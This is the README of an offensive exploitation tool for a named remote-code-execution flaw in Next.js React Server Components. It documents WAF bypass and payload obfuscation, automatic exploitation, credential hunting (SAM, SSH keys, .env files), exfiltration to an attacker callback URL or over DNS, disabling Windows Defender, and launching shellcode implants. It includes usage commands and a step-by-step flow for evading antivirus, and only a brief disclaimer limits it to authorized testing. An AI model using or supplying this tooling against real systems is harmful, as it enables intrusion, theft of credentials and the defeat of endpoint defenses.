# React2Shell Advanced v3

Advanced exploitation framework for **CVE-2025-55182** — Remote Code Execution in Next.js React Server Components via insecure deserialization in the Flight protocol.

> ⚠️ **For authorized security testing and CTF challenges only.**

## Features

### Exploitation
- **Dual Payload Strategies** — Strategy A (3-part) and Strategy B (5-part lachlan2k variant)
- **Safe Probe** — Non-RCE vulnerability detection without executing code
- **Auto-Escalation** — Tries 30 combinations of strategy × bypass × exfil automatically
- **OS Auto-Detection** — Detects Windows vs Linux targets and adapts commands

### WAF Bypass
- 6 bypass presets (`none`, `light`, `medium`, `generic`, `heavy`, `aggressive`)
- Unicode JSON escaping for keywords (`__proto__`, `constructor`)
- Multipart structure manipulation (boundary obfuscation, charset tricks)
- JS code obfuscation via `eval(Buffer.from(b64))`
- Custom Host header for reverse-proxy bypass (`-H domain`)
- Auto domain resolution from IP via reverse DNS

### Post-Exploitation Enumeration
- **`.info`** — Quick system enumeration (user, OS, IP, privileges, AV)
- **`.fullinfo`** — Comprehensive enumeration (runs all modules below)
- **`.users`** — User enumeration, group membership, privileges
- **`.ps`** — Running processes
- **`.net`** — Network interfaces, connections, ARP, routes, DNS
- **`.services`** — Running and startup services
- **`.shares`** — Network shares and mapped drives
- **`.firewall`** — Firewall status and rules
- **`.secrets`** — Credential hunting (env vars, SSH keys, SAM, `.env` files, registry)
- **`.persist`** — Persistence check (scheduled tasks, SUID, cron, startup)
- **`.software`** — Installed software, patches, runtime versions

### File Operations
- **`.upload`** — Chunked upload with 6KB chunks, PowerShell `Set-Content`/`Add-Content` (no `\r\n` corruption), retry logic (3 attempts/chunk), file size verification
- **`.download`** — Download files from target (base64 via PowerShell/base64)
- **`.cat`** — Cross-platform file reader with auto backslash→forward-slash conversion

### Execution Tactics
- **`.exec path [args]`** — Smart executable launcher:
  - Resolves relative paths to full CWD-based paths
  - Checks file existence before attempting execution
  - Tries: `cmd /c` (full path), `cmd /c` (`.\` prefix), PowerShell, WMIC, background `start`
  - Interprets WMIC return codes (0=Success, 2=Access Denied, 9=Path Not Found, etc.)
  - Detects AV-blocked output
  - Last resort: copy+rename with random name to evade signature detection
- **`.bg cmd`** — Fire-and-forget background execution (no output wait)
- **`.kill pid|name`** — Kill process by PID or image name

### AV/Defender Management
- **`.av`** — Full AV status: Defender RT protection, exclusions, running AV processes, **recent threat detections**
- **`.avoff`** — Disable Defender real-time monitoring (tries `Set-MpPreference`, `sc config`, `sc stop`, registry)
- **`.exclude path`** — Add Defender exclusion path

### Shell
- All commands auto-capture **stderr** (`2>&1`) — no more silent failures
- Directory traversal with `cd` (Windows: forward-slash CWD, bare drive letters `cd C:`, `cd ..` at root)
- Readline history, output saving, interactive prompt with status display
- Multi-channel exfiltration: redirect, error, OOB callback, DNS

## Installation

```bash
pip install requests
```

## Usage

```bash
# Interactive shell
python3 react2shell_advanced.py -u https://target.com

# Safe vulnerability check (no code execution)
python3 react2shell_advanced.py -u https://target.com --safeprobe

# Full auto-escalation (tries all bypass × strategy × exfil combos)
python3 react2shell_advanced.py -u https://target.com --auto-pwn

# Single command
python3 react2shell_advanced.py -u https://target.com -c "whoami"

# Custom Host header (bypass WAF blocking IP-based requests)
python3 react2shell_advanced.py -u http://1.2.3.4:3000 -H target.com

# WAF bypass + obfuscation
python3 react2shell_advanced.py -u https://target.com -j 2 -o 3 --bypass medium

# OOB callback exfiltration
python3 react2shell_advanced.py -u https://target.com --exfil callback --callback-url http://YOUR_IP:PORT
```

## Shell Commands Reference

### Exploit Controls
| Command | Description |
|---------|-------------|
| `.safeprobe` | Non-RCE vulnerability check |
| `.auto [cmd]` | Auto-escalate through all 30 combos |
| `.rawtest [cmd]` | Raw response debug |
| `.strategy A\|B` | Switch payload variant |
| `.exfil [ch]` | Switch exfil channel |
| `.bypass [preset]` | WAF bypass preset |
| `.obf N` | JS obfuscation level (0–4) |
| `.jsonesc N` | Unicode JSON escaping (0–2) |
| `.host domain` | Set custom Host header |

### Post-Exploitation
| Command | Description |
|---------|-------------|
| `.info` | Quick system enumeration |
| `.fullinfo` | Full enumeration (all modules) |
| `.users` | User accounts and privileges |
| `.ps` | Running processes |
| `.net` | Network info |
| `.services` | Running services |
| `.shares` | Network shares |
| `.firewall` | Firewall rules |
| `.secrets` | Credential hunting |
| `.persist` | Persistence mechanisms |
| `.software` | Installed software |

### File Operations
| Command | Description |
|---------|-------------|
| `.upload local remote` | Upload file (chunked, retries, size verification) |
| `.download remote [local]` | Download file from target |
| `.cat path` | Read file content |
| `cd path` | Change directory (supports `cd C:`, `cd ..`) |

### Execution
| Command | Description |
|---------|-------------|
| `.exec path [args]` | Smart exe launcher (tries 5+ methods) |
| `.bg cmd` | Background execution (fire & forget) |
| `.kill pid\|name` | Kill process by PID or name |

### AV/Defender
| Command | Description |
|---------|-------------|
| `.av` | AV status, exclusions, recent threats |
| `.avoff` | Disable Defender real-time protection |
| `.exclude path` | Add Defender exclusion path |

### Utility
| Command | Description |
|---------|-------------|
| `.save` | Save last output to file |
| `.status` | Show current config |
| `.debug` | Toggle debug output |
| `.root` | Toggle sudo mode (Linux) |
| `.timeout N` | Set request timeout |
| `.waf` | Fingerprint WAF |

## Running Complex Commands

Commands typed directly in the shell automatically capture stderr. For executables with arguments:

```bash
# Direct execution (auto-captures stderr)
user@target$ lsasp.exe --payload rundll.enc --verbose

# Smart launcher with full path resolution + multi-method fallback
user@target$ .exec lsasp.exe --payload rundll.enc --encrypted --password "S3cret!" --type shellcode --exec-mode fork --verbose

# Fire-and-forget for tools that run silently (shellcode loaders, implants)
user@target$ .bg lsasp.exe --payload rundll.enc --encrypted --password "S3cret!" --type shellcode --exec-mode fork --blinding --stack-spoof --no-cleanup

# If Defender blocks execution:
user@target$ .av                          # Check AV status and what was blocked
user@target$ .avoff                       # Try to disable RT protection
user@target$ .exclude c:\Users\Public     # Or add exclusion for your drop directory
user@target$ .upload tool.exe c:\Users\Public\tool.exe   # Re-upload
user@target$ .exec tool.exe              # Try again
```

### Recommended Execution Flow
1. **Upload**: `.upload /local/path/tool.exe c:\Users\Public\tool.exe`
2. **Check AV**: `.av` — see if Defender is active
3. **Exclude** (if needed): `.exclude c:\Users\Public`
4. **Execute**: `.exec tool.exe --flags` — smart launcher tries all methods
5. **Background** (if silent tool): `.bg tool.exe --flags`
6. **Verify**: `tasklist | findstr tool` — check if process is running

## CLI Options

```
-u, --url           Target URL (required)
-c, --command       Execute single command
-H, --host          Custom Host header
--strategy A|B      Payload variant
--bypass PRESET     WAF bypass preset
--exfil CHANNEL     Exfiltration method
-o, --obfuscate N   JS obfuscation level (0-4)
-j, --json-escape N Unicode JSON escaping (0-2)
--stealth           Stealth mode (random UA, delays)
--callback-url URL  Callback URL for OOB exfil
--dns-domain DOM    Domain for DNS exfil
--proxy URL         HTTP proxy
--timeout N         Request timeout (default: 90s)
--debug             Debug output
--auto-pwn          Full auto-escalation
--safeprobe         Non-RCE vulnerability check
```

## Disclaimer

This tool is intended for **authorized penetration testing** and **CTF competitions** only. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse.
